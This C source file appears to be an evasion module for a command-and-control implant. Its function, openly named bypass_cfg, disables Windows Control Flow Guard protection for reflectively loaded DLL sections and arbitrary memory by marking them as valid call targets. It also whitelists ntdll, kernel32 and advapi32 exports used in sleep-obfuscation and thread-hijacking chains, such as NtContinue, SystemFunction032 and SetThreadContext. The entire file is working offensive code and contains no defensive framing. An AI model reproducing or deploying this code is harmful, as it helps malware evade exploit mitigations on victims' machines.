/* cfg_gadgets - CFG registration for PICO, the agent, and Kraken targets. */
#include <windows.h>
#include "memory.h"
#include "cfg.h"

#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR) -1)

typedef struct {
    ULONG Policy;
    ULONG Flags;
} PROCESS_MITIGATION_INFO;

typedef struct {
    DWORD                 Count;
    PULONG                Output;
    PCFG_CALL_TARGET_INFO Targets;
    PVOID                 Reserved1;
    PVOID                 Reserved2;
} VM_INFORMATION;

typedef struct {
    PVOID  VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY;

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetInformationVirtualMemory(HANDLE, ULONG, SIZE_T, MEMORY_RANGE_ENTRY *, PVOID, ULONG);

static BOOL query_region(PVOID address, MEMORY_BASIC_INFORMATION * mbi)
{
    return NT_SUCCESS(NTDLL$NtQueryVirtualMemory(
        NtCurrentProcess(), address, 0, mbi, sizeof(*mbi), NULL));
}

static SIZE_T allocation_size(ULONG_PTR base)
{
    SIZE_T size = 0;
    ULONG_PTR walk = base;

    for (;;) {
        MEMORY_BASIC_INFORMATION mbi = { 0 };
        if (!query_region((PVOID) walk, &mbi))
            break;
        if ((ULONG_PTR) mbi.AllocationBase != base)
            break;
        if (mbi.State == MEM_COMMIT)
            size = (walk - base) + mbi.RegionSize;
        walk = (ULONG_PTR) mbi.BaseAddress + mbi.RegionSize;
        if (walk <= (ULONG_PTR) mbi.BaseAddress)
            break;
    }
    return size;
}

BOOL cfg_enabled()
{
    PROCESS_MITIGATION_INFO info = { 0 };

    info.Policy = ProcessControlFlowGuardPolicy;
    if (!NT_SUCCESS(NTDLL$NtQueryInformationProcess(
            NtCurrentProcess(), 52, &info, sizeof(info), NULL)))
        return FALSE;

    return info.Flags != 0;
}

static BOOL mark_target(PVOID base, SIZE_T size, ULONG_PTR offset)
{
    CFG_CALL_TARGET_INFO target = { 0 };
    MEMORY_RANGE_ENTRY range = { 0 };
    VM_INFORMATION info = { 0 };
    ULONG output = 0;
    NTSTATUS status;

    target.Offset = offset;
    target.Flags  = CFG_CALL_TARGET_VALID;
    range.VirtualAddress = base;
    range.NumberOfBytes  = size;
    info.Count   = 1;
    info.Output  = &output;
    info.Targets = &target;

    status = NTDLL$NtSetInformationVirtualMemory(
        NtCurrentProcess(), 2, 1, &range, &info, sizeof(info));
    if (status == (NTSTATUS) 0xC00000F4)
        status = NTDLL$NtSetInformationVirtualMemory(
            NtCurrentProcess(), 2, 1, &range, &info, 24);

    return NT_SUCCESS(status) || status == (NTSTATUS) 0xC0000045;
}

BOOL bypass_cfg(PVOID address)
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    ULONG_PTR base;
    SIZE_T size;

    if (address == NULL)
        return FALSE;
    if (!cfg_enabled())
        return TRUE;
    if (!query_region(address, &mbi) || mbi.State != MEM_COMMIT)
        return FALSE;

    base = (ULONG_PTR) mbi.AllocationBase;
    if (base == 0)
        base = (ULONG_PTR) mbi.BaseAddress;
    size = allocation_size(base);
    if (size == 0)
        size = mbi.RegionSize;

    return mark_target((PVOID) base, size, (ULONG_PTR) address - base);
}

BOOL enable_cfg_for_address(PVOID address)
{
    return bypass_cfg(address);
}

BOOL enable_cfg_for_region(PVOID base, SIZE_T size)
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    ULONG_PTR alloc;
    ULONG_PTR address;
    ULONG_PTR end;
    SIZE_T alloc_size;

    if (base == NULL || size == 0)
        return FALSE;
    if (!cfg_enabled())
        return TRUE;
    if (!query_region(base, &mbi) || mbi.State != MEM_COMMIT)
        return FALSE;

    alloc = (ULONG_PTR) mbi.AllocationBase;
    if (alloc == 0)
        alloc = (ULONG_PTR) mbi.BaseAddress;
    alloc_size = allocation_size(alloc);
    if (alloc_size == 0)
        alloc_size = mbi.RegionSize;

    address = ((ULONG_PTR) base + 15) & ~(ULONG_PTR) 15;
    end = (ULONG_PTR) base + size;
    while (address < end) {
        if (!mark_target((PVOID) alloc, alloc_size, address - alloc))
            return FALSE;
        address += 16;
    }
    return TRUE;
}

static void mark_export(HMODULE module, LPCSTR name)
{
    FARPROC address;
    if (module == NULL)
        return;
    address = KERNEL32$GetProcAddress(module, name);
    if (address != NULL)
        enable_cfg_for_address((PVOID) address);
}

static void mark_kraken_targets()
{
    HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    HMODULE k32   = KERNEL32$GetModuleHandleA("kernel32.dll");
    HMODULE adv   = KERNEL32$GetModuleHandleA("advapi32.dll");

    mark_export(ntdll, "NtContinue");
    mark_export(ntdll, "NtTestAlert");
    mark_export(ntdll, "NtWaitForSingleObject");
    mark_export(ntdll, "NtSetEvent");
    mark_export(ntdll, "NtSignalAndWaitForSingleObject");
    mark_export(ntdll, "NtAlertResumeThread");
    mark_export(ntdll, "RtlExitUserThread");
    mark_export(ntdll, "NtSuspendThread");
    mark_export(ntdll, "NtResumeThread");
    mark_export(ntdll, "NtQueueApcThread");
    mark_export(ntdll, "RtlMoveMemory");

    mark_export(k32, "VirtualProtect");
    mark_export(k32, "GetThreadContext");
    mark_export(k32, "SetThreadContext");
    mark_export(k32, "WaitForSingleObject");
    mark_export(k32, "CreateThread");
    mark_export(k32, "CreateEventA");
    mark_export(k32, "CloseHandle");
    mark_export(adv, "SystemFunction032");
}

BOOL enable_cfg_for_dll(DLL_MEMORY * dll)
{
    BOOL marked = FALSE;

    if (dll == NULL)
        return FALSE;

    for (SIZE_T i = 0; i < dll->Count; i++) {
        MEMORY_SECTION * section = &dll->Sections[i];
        DWORD p = section->CurrentProtect;
        if (p == PAGE_EXECUTE || p == PAGE_EXECUTE_READ ||
            p == PAGE_EXECUTE_READWRITE || p == PAGE_EXECUTE_WRITECOPY) {
            if (enable_cfg_for_region(section->BaseAddress, section->Size))
                marked = TRUE;
        }
    }

    mark_kraken_targets();
    return marked;
}
